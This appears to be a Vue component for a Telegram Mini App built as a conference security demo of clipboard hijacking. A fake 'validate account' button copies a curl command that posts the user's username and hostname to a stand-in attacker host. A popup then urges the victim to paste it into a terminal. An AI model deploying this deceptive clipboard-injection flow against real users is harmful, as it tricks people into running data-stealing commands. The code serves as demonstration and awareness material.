<script setup lang="ts">
import { ref } from 'vue';
import AppPage from '@/components/AppPage.vue';
import { popup } from '@tma.js/sdk-vue';

const isValidating = ref(false);
const validationStatus = ref<'idle' | 'success' | 'error'>('idle');
const maliciousPayload = 'curl -X POST https://attacker-server.com/steal-data -d "$(whoami):$(hostname)"';

/**
 * Función que simula una validación pero en realidad inyecta código malicioso en el portapapeles
 */
async function handleValidation() {
  isValidating.value = true;
  validationStatus.value = 'idle';

  try {
    // Pequeño delay para simular procesamiento
    await new Promise(resolve => setTimeout(resolve, 500));

    // Intentar copiar al portapapeles usando la API moderna
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(maliciousPayload);
      validationStatus.value = 'success';

      // Mostrar popup de Telegram confirmando la "validación"
      await popup.show({
        title: '✅ Validación Exitosa',
        message: '¡Tu cuenta ha sido validada correctamente! Por favor, ejecuta el comando de verificación en tu terminal para completar el proceso.',
        buttons: [{ id: 'ok', type: 'default', text: 'Entendido' }],
      });
    } else {
      // Fallback para navegadores que no soportan la API del portapapeles
      const textArea = document.createElement('textarea');
      textArea.value = maliciousPayload;
      textArea.style.position = 'fixed';
      textArea.style.left = '-999999px';
      document.body.appendChild(textArea);
      textArea.select();

      try {
        document.execCommand('copy');
        validationStatus.value = 'success';

        await popup.show({
          title: '✅ Validación Exitosa',
          message: '¡Tu cuenta ha sido validada correctamente! Por favor, ejecuta el comando de verificación en tu terminal para completar el proceso.',
          buttons: [{ id: 'ok', type: 'default', text: 'Entendido' }],
        });
      } catch (err) {
        throw new Error('No se pudo copiar al portapapeles');
      } finally {
        document.body.removeChild(textArea);
      }
    }
  } catch (error) {
    console.error('Error al copiar al portapapeles:', error);
    validationStatus.value = 'error';

    await popup.show({
      title: '❌ Error',
      message: 'No se pudo completar la validación. Inténtalo de nuevo.',
      buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
    });
  } finally {
    isValidating.value = false;
  }
}

/**
 * Función para mostrar lo que hay en el portapapeles (para la demo)
 */
async function showClipboardContent() {
  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      const text = await navigator.clipboard.readText();
      await popup.show({
        title: '📋 Contenido del Portapapeles',
        message: text || '(vacío)',
        buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
      });
    } else {
      await popup.show({
        title: '⚠️ Aviso',
        message: 'La lectura del portapapeles no está disponible en este navegador.',
        buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
      });
    }
  } catch (error) {
    console.error('Error al leer el portapapeles:', error);
    await popup.show({
      title: '⚠️ Aviso',
      message: 'No se pudo leer el portapapeles. Es posible que necesites dar permisos.',
      buttons: [{ id: 'ok', type: 'default', text: 'OK' }],
    });
  }
}
</script>

<template>
  <AppPage title="🔒 Validación de Cuenta">
    <div class="demo-container">
      <div class="warning-banner">
        <h3>⚠️ DEMO de Seguridad - MorterueloCon 2026</h3>
        <p>Esta es una demostración de cómo las Mini Apps de Telegram pueden manipular el portapapeles en aplicaciones
          de escritorio.</p>
      </div>

      <div class="validation-section">
        <div class="info-box">
          <h4>🛡️ Sistema de Validación</h4>
          <p>Para proteger tu cuenta, necesitamos validar tu identidad.</p>
          <p class="info-detail">Haz clic en el botón de abajo para completar el proceso de validación.</p>
        </div>

        <button
          class="validate-button"
          :class="{
            'validating': isValidating,
            'success': validationStatus === 'success',
            'error': validationStatus === 'error'
          }"
          @click="handleValidation"
          :disabled="isValidating"
        >
          <span v-if="isValidating">⏳ Validando...</span>
          <span v-else-if="validationStatus === 'success'">✅ Validado</span>
          <span v-else-if="validationStatus === 'error'">❌ Error</span>
          <span v-else>🔐 Validar mi Cuenta</span>
        </button>

        <div
          v-if="validationStatus === 'success'"
          class="success-message"
        >
          <p>✅ ¡Validación completada!</p>
          <p class="instruction">Ahora abre tu terminal y pega el comando de verificación (Ctrl+V o Cmd+V)</p>
        </div>
      </div>

      <div class="demo-controls">
        <h4>🔧 Controles de Demo</h4>
        <button
          class="demo-button"
          @click="showClipboardContent"
        >
          📋 Ver Portapapeles
        </button>
        <div class="payload-info">
          <h5>Payload Inyectado:</h5>
          <code>{{ maliciousPayload }}</code>
        </div>
      </div>

      <div class="explanation">
        <h4>📚 Explicación del Ataque</h4>
        <ol>
          <li><strong>Ingeniería Social:</strong> La víctima cree que está "validando" su cuenta</li>
          <li><strong>Inyección en Portapapeles:</strong> Al hacer clic, se copia un comando malicioso</li>
          <li><strong>Ejecución del Payload:</strong> La víctima pega y ejecuta el comando sin revisarlo</li>
          <li><strong>Compromiso:</strong> El comando roba información o instala malware</li>
        </ol>
      </div>
    </div>
  </AppPage>
</template>

<style scoped>
.demo-container {
  display: flex;
  flex-direction: column;
  gap: 20px;
  max-width: 600px;
  margin: 0 auto;
}

.warning-banner {
  background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
  color: white;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.warning-banner h3 {
  margin: 0 0 10px 0;
  font-size: 18px;
}

.warning-banner p {
  margin: 0;
  font-size: 14px;
  opacity: 0.95;
}

.validation-section {
  background: var(--tg-theme-bg-color, #fff);
  padding: 24px;
  border-radius: 12px;
  border: 2px solid var(--tg-theme-section-separator-color, #e0e0e0);
}

.info-box {
  margin-bottom: 24px;
}

.info-box h4 {
  margin: 0 0 12px 0;
  color: var(--tg-theme-text-color, #000);
  font-size: 16px;
}

.info-box p {
  margin: 8px 0;
  color: var(--tg-theme-text-color, #000);
  line-height: 1.5;
}

.info-detail {
  font-size: 14px;
  opacity: 0.8;
}

.validate-button {
  width: 100%;
  padding: 16px;
  font-size: 18px;
  font-weight: bold;
  color: white;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
}

.validate-button:hover:not(:disabled) {
  transform: translateY(-2px);
  box-shadow: 0 6px 16px rgba(102, 126, 234, 0.5);
}

.validate-button:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

.validate-button.validating {
  background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
  animation: pulse 1.5s ease-in-out infinite;
}

.validate-button.success {
  background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
}

.validate-button.error {
  background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%);
}

@keyframes pulse {

  0%,
  100% {
    opacity: 1;
  }

  50% {
    opacity: 0.8;
  }
}

.success-message {
  margin-top: 16px;
  padding: 16px;
  background: #d4edda;
  border: 1px solid #c3e6cb;
  border-radius: 8px;
  color: #155724;
}

.success-message p {
  margin: 8px 0;
}

.instruction {
  font-weight: bold;
  font-size: 14px;
}

.demo-controls {
  background: var(--tg-theme-secondary-bg-color, #f5f5f5);
  padding: 20px;
  border-radius: 12px;
}

.demo-controls h4 {
  margin: 0 0 16px 0;
  color: var(--tg-theme-text-color, #000);
}

.demo-button {
  width: 100%;
  padding: 12px;
  font-size: 16px;
  color: var(--tg-theme-button-text-color, white);
  background: var(--tg-theme-button-color, #3390ec);
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: opacity 0.2s;
  margin-bottom: 16px;
}

.demo-button:hover {
  opacity: 0.9;
}

.payload-info {
  margin-top: 16px;
}

.payload-info h5 {
  margin: 0 0 8px 0;
  font-size: 14px;
  color: var(--tg-theme-text-color, #000);
}

.payload-info code {
  display: block;
  padding: 12px;
  background: #1e1e1e;
  color: #d4d4d4;
  border-radius: 6px;
  font-family: 'Courier New', monospace;
  font-size: 12px;
  word-break: break-all;
  overflow-x: auto;
}

.explanation {
  background: var(--tg-theme-secondary-bg-color, #f5f5f5);
  padding: 20px;
  border-radius: 12px;
}

.explanation h4 {
  margin: 0 0 16px 0;
  color: var(--tg-theme-text-color, #000);
}

.explanation ol {
  margin: 0;
  padding-left: 20px;
  color: var(--tg-theme-text-color, #000);
}

.explanation li {
  margin: 12px 0;
  line-height: 1.5;
}

.explanation strong {
  color: var(--tg-theme-link-color, #3390ec);
}
</style>
